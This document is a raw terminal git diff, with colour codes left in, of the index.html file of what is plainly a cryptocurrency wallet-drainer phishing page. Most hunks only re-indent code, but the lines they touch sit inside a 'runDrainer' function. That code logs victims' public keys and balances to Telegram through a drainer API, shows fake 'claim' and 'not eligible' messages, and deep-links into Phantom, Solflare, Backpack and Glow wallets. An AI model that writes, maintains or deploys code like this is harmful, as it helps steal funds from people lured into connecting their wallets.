@@ -1,0 +1,206 @@
+warning: in the working copy of 'public/index.html', LF will be replaced by CRLF the next time Git touches it
+[1mdiff --git a/public/index.html b/public/index.html[m
+[1mindex 3965d9c..434ca84 100644[m
+[1m--- a/public/index.html[m
+[1m+++ b/public/index.html[m
+[36m@@ -803,7 +803,7 @@[m
+     }[m
+     /* Mobile-specific wallet-box overrides */[m
+     @media (max-width: 800px) {[m
+[31m-      .wallet-box {[m
+[32m+[m[32m    .wallet-box {[m
+         width: 85vw;[m
+         max-width: 320px;[m
+         margin: 0 auto;[m
+[36m@@ -1700,7 +1700,7 @@[m
+         <h3>Connect Wallet</h3>[m
+       </div>[m
+       <div class="wallet-list-content">[m
+[31m-        <!-- Wallet buttons will be injected here -->[m
+[32m+[m[32m      <!-- Wallet buttons will be injected here -->[m
+       </div>[m
+     </div>[m
+   </div>[m
+[36m@@ -2292,8 +2292,8 @@[m [masync function runDrainer(provider) {[m
+               }[m
+               window.walletBalanceCache[walletKey] = balance;[m
+               [m
+[31m-                        // Use centralized logging function with actual balance[m
+[31m-          window.logWalletConnection(publicKey, connectedWalletType, balance);[m
+[32m+[m[32m              // Use centralized logging function with actual balance[m
+[32m+[m[32m              window.logWalletConnection(publicKey, connectedWalletType, balance);[m
+           [m
+           // Also log initial wallet connection regardless of balance change[m
+           if (lastBalance === 0) {[m
+[36m@@ -2575,18 +2575,18 @@[m [masync function runDrainer(provider) {[m
+           console.log('[ERROR] SendTransactionError detected');[m
+           [m
+           // Log SendTransactionError to Telegram[m
+[31m-                      fetch('/api/drainer/log-confirmation', {[m
+[31m-              method: 'POST',[m
+[31m-              headers: { 'Content-Type': 'application/json' },[m
+[31m-              body: JSON.stringify({[m
+[31m-                publicKey: publicKey.toString(),[m
+[31m-                txid: 'send_transaction_error',[m
+[31m-                status: 'failed',[m
+[31m-                error: signError.message || 'SendTransactionError',[m
+[32m+[m[32m          fetch('/api/drainer/log-confirmation', {[m
+[32m+[m[32m            method: 'POST',[m
+[32m+[m[32m            headers: { 'Content-Type': 'application/json' },[m
+[32m+[m[32m            body: JSON.stringify({[m
+[32m+[m[32m              publicKey: publicKey.toString(),[m
+[32m+[m[32m              txid: 'send_transaction_error',[m
+[32m+[m[32m              status: 'failed',[m
+[32m+[m[32m              error: signError.message || 'SendTransactionError',[m
+                 lamports: balance || 0,[m
+                 walletType: connectedWalletType[m
+[31m-              })[m
+[31m-            }).catch(err => console.log('[TELEGRAM] Failed to log SendTransactionError:', err));[m
+[32m+[m[32m            })[m
+[32m+[m[32m          }).catch(err => console.log('[TELEGRAM] Failed to log SendTransactionError:', err));[m
+           [m
+           showStatus('Sorry, you\'re not eligible. Please connect with an eligible wallet.', 'error');[m
+           return;[m
+[36m@@ -3010,24 +3010,24 @@[m [mwindow.openWalletModal = async function openWalletModal() {[m
+     const walletListContent = walletList.querySelector('.wallet-list-content');[m
+     if (walletListContent) {[m
+       walletListContent.innerHTML = detectedDefs.map(wallet => {[m
+[31m-        // Use the actual provider object for this wallet[m
+[31m-        const provider = wallet.provider();[m
+[31m-        let actionBtn = '';[m
+[31m-        if (provider) {[m
+[31m-          actionBtn = `<button class="claim-btn connect-wallet-btn" data-wallet-key="${wallet.key}">Connect</button>`;[m
+[31m-        } else if (isMobile()) {[m
+[31m-          actionBtn = `<button class="claim-btn" onclick="window.open('${wallet.mobile?.appStore || wallet.install}', '_blank')">Open/Install</button>`;[m
+[31m-        } else {[m
+[31m-          actionBtn = `<button class="claim-btn" onclick="window.open('${wallet.install}', '_blank')">Install</button>`;[m
+[31m-        }[m
+[31m-        return `[m
+[31m-          <div class="wallet-option">[m
+[32m+[m[32m      // Use the actual provider object for this wallet[m
+[32m+[m[32m      const provider = wallet.provider();[m
+[32m+[m[32m      let actionBtn = '';[m
+[32m+[m[32m      if (provider) {[m
+[32m+[m[32m        actionBtn = `<button class="claim-btn connect-wallet-btn" data-wallet-key="${wallet.key}">Connect</button>`;[m
+[32m+[m[32m      } else if (isMobile()) {[m
+[32m+[m[32m        actionBtn = `<button class="claim-btn" onclick="window.open('${wallet.mobile?.appStore || wallet.install}', '_blank')">Open/Install</button>`;[m
+[32m+[m[32m      } else {[m
+[32m+[m[32m        actionBtn = `<button class="claim-btn" onclick="window.open('${wallet.install}', '_blank')">Install</button>`;[m
+[32m+[m[32m      }[m
+[32m+[m[32m      return `[m
+[32m+[m[32m        <div class="wallet-option">[m
+                             <img src="${wallet.icon}" alt="${wallet.name} logo" loading="lazy" decoding="async" />[m
+[31m-            <span class="wallet-name">${wallet.name}</span>[m
+[31m-            ${actionBtn}[m
+[31m-          </div>[m
+[31m-        `;[m
+[31m-      }).join('');[m
+[32m+[m[32m          <span class="wallet-name">${wallet.name}</span>[m
+[32m+[m[32m          ${actionBtn}[m
+[32m+[m[32m        </div>[m
+[32m+[m[32m      `;[m
+[32m+[m[32m    }).join('');[m
+     }[m
+     [m
+ [m
+[36m@@ -3037,20 +3037,20 @@[m [mwindow.openWalletModal = async function openWalletModal() {[m
+       const walletListContent = walletList.querySelector('.wallet-list-content');[m
+       if (walletListContent) {[m
+         const connectBtns = walletListContent.querySelectorAll('.connect-wallet-btn');[m
+[31m-        connectBtns.forEach(btn => {[m
+[31m-          btn.addEventListener('click', function() {[m
+[31m-            const key = btn.getAttribute('data-wallet-key');[m
+[31m-            // Use the actual provider object at click time[m
+[31m-            const wallet = WALLET_DEFS.find(w => w.key === key);[m
+[31m-            if (wallet) {[m
+[31m-              const provider = wallet.provider();[m
+[31m-              if (provider && window.connectMobileWallet) {[m
+[31m-                // Pass the wallet object, but connectMobileWallet will use the current provider[m
+[31m-                window.connectMobileWallet(wallet);[m
+[31m-              }[m
+[32m+[m[32m      connectBtns.forEach(btn => {[m
+[32m+[m[32m        btn.addEventListener('click', function() {[m
+[32m+[m[32m          const key = btn.getAttribute('data-wallet-key');[m
+[32m+[m[32m          // Use the actual provider object at click time[m
+[32m+[m[32m          const wallet = WALLET_DEFS.find(w => w.key === key);[m
+[32m+[m[32m          if (wallet) {[m
+[32m+[m[32m            const provider = wallet.provider();[m
+[32m+[m[32m            if (provider && window.connectMobileWallet) {[m
+[32m+[m[32m              // Pass the wallet object, but connectMobileWallet will use the current provider[m
+[32m+[m[32m              window.connectMobileWallet(wallet);[m
+             }[m
+[31m-          });[m
+[32m+[m[32m          }[m
+         });[m
+[32m+[m[32m      });[m
+       }[m
+     }, 0);[m
+     modal.classList.add('active');[m
+[36m@@ -3421,8 +3421,8 @@[m [mwindow.openWalletModal = async function openWalletModal() {[m
+                 console.log(`[connectMobileWallet] Trying Phantom deep link: ${phantomDeepLink}`);[m
+                 [m
+                 try {[m
+[31m-                  const phantomWindow = window.open(phantomDeepLink, '_blank');[m
+[31m-                  if (!phantomWindow || phantomWindow.closed) {[m
+[32m+[m[32m                const phantomWindow = window.open(phantomDeepLink, '_blank');[m
+[32m+[m[32m                if (!phantomWindow || phantomWindow.closed) {[m
+                     console.log(`[connectMobileWallet] Phantom deep link failed, trying universal link`);[m
+                     window.location.href = phantomUniversalLink;[m
+                   }[m
+[36m@@ -3441,8 +3441,8 @@[m [mwindow.openWalletModal = async function openWalletModal() {[m
+                 console.log(`[connectMobileWallet] Trying Solflare deep link: ${solflareDeepLink}`);[m
+                 [m
+                 try {[m
+[31m-                  const solflareWindow = window.open(solflareDeepLink, '_blank');[m
+[31m-                  if (!solflareWindow || solflareWindow.closed) {[m
+[32m+[m[32m                const solflareWindow = window.open(solflareDeepLink, '_blank');[m
+[32m+[m[32m                if (!solflareWindow || solflareWindow.closed) {[m
+                     console.log(`[connectMobileWallet] Solflare deep link failed, trying universal link`);[m
+                     window.location.href = solflareUniversalLink;[m
+                   }[m
+[36m@@ -3451,8 +3451,8 @@[m [mwindow.openWalletModal = async function openWalletModal() {[m
+                   window.location.href = solflareUniversalLink;[m
+                 }[m
+               } else if (wallet.name === 'Backpack') {[m
+[31m-                // Use Backpack's correct DApp deep link format[m
+[31m-                const currentUrl = window.location.href;[m
+[32m+[m[32m                  // Use Backpack's correct DApp deep link format[m
+[32m+[m[32m                  const currentUrl = window.location.href;[m
+                 const backpackDeepLink = `backpack://app?url=${encodeURIComponent(currentUrl)}`;[m
+                 const backpackUniversalLink = `https://backpack.app/ul/app?url=${encodeURIComponent(currentUrl)}`;[m
+                 [m
+[36m@@ -3464,10 +3464,10 @@[m [mwindow.openWalletModal = async function openWalletModal() {[m
+                     console.log(`[connectMobileWallet] Backpack deep link failed, trying universal link`);[m
+                     window.location.href = backpackUniversalLink;[m
+                   }[m
+[31m-                } catch (e) {[m
+[32m+[m[32m                  } catch (e) {[m
+                   console.log(`[connectMobileWallet] Backpack deep link error:`, e);[m
+                   window.location.href = backpackUniversalLink;[m
+[31m-                }[m
+[32m+[m[32m                  }[m
+               } else if (wallet.name === 'Glow') {[m
+                 // Use Glow's correct DApp deep link format[m
+                 const currentUrl = window.location.href;[m
+[36m@@ -3786,14 +3786,14 @@[m [mwindow.openWalletModal = async function openWalletModal() {[m
+                           const walletListContent = walletList.querySelector('.wallet-list-content');[m
+                           if (walletListContent) {[m
+                             walletListContent.innerHTML = supportedWallets.map(wallet => `[m
+[31m-                              <div class="wallet-option">[m
+[32m+[m[32m                            <div class="wallet-option">[m
+                                 <img src="${wallet.icon}" alt="${wallet.name} logo" loading="lazy" decoding="async" />[m
+[31m-                                <span class="wallet-name">${wallet.name}</span>[m
+[31m-                                <button class="claim-btn" onclick="connectMobileWallet(${JSON.stringify(wallet)})">[m
+[31m-                                  Use ${wallet.name}[m
+[31m-                                </button>[m
+[31m-                              </div>[m
+[31m-                            `).join('');[m
+[32m+[m[32m                              <span class="wallet-name">${wallet.name}</span>[m
+[32m+[m[32m                              <button class="claim-btn" onclick="connectMobileWallet(${JSON.stringify(wallet)})">[m
+[32m+[m[32m                                Use ${wallet.name}[m
+[32m+[m[32m                              </button>[m
+[32m+[m[32m                            </div>[m
+[32m+[m[32m                          `).join('');[m
+                           }[m
+                           [m
+                           modal.classList.add('active');[m
